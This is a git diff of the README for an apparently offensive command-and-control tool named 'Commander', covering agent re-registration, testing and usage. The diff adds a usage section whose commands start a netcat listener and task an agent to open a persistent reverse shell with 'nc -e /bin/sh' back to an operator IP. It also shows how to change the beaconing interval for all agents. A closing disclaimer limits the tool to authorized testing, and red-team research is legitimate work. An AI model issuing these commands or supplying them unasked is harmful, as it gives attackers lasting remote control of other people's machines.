@@ -81,7 +81,7 @@ Special attention should be given to the 'find active agents' command. This comm
 The idea behind this functionality is that the c2 server can request from an agent to re-register at the case that it doesn't recognize him.
 So, since we want to clear the db from unused old entries and at the same time find all the currently active hosts we can drop the tables and trigger the re-register mechanism of the c2 server. See below for the re-registration mechanism.
 
-### Flows
+## Flows
 Below you can find a normal flow diagram
 ##### Normal Flow
 ![screenshot](screenshots/c2_normal_flow2.jpg)
@@ -93,12 +93,42 @@ More specifically, in case where we lose the database we will not have any infor
 
 Below is the flow diagram for this case.
 
+##### Re-register Flow
 ![screenshot](screenshots/c2_reregister_flow2.jpg)
 
-### Testing
+## Useful examples
+To setup your environment start the admin.py first and then the c2_server.py and run the agent. After you can check the availiable agents and also task them to run a "die hard" reverse shell. Do that like this:
+
+```
+# show all availiable agents
+show agent all
+
+# first open a netcat on your machine
+nc -vnlp 4444
+
+# add a task to open a reverse shell for a specific agent
+task add 85913eb1245d40eb96cf53eaf0b1e241 c2-shell nc -e /bin/sh 192.168.1.3 4444
+
+```
+This way you will have a shell that even if you get disconnected it will get back up immediately. Only the interactive commands will make it die permanently.
+
+You can also change the interval of the agents that checks for tasks to 30 seconds like this:
+
+```
+# to set it for all agents
+task add all c2-sleep 30
+```
+
+## Testing
 pytest was used for the testing. You can run the tests like this:
 ```
 py.test
 ```
+To check the code coverage and produce a nice html report you can use this:
+```
+# pip3 install pytest-cov
+python -m pytest --cov=Commander --cov-report html
+```
+
 
 **Disclaimer**: This tool is only intended to be a proof of concept demonstration tool for authorized security testing. Running this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.
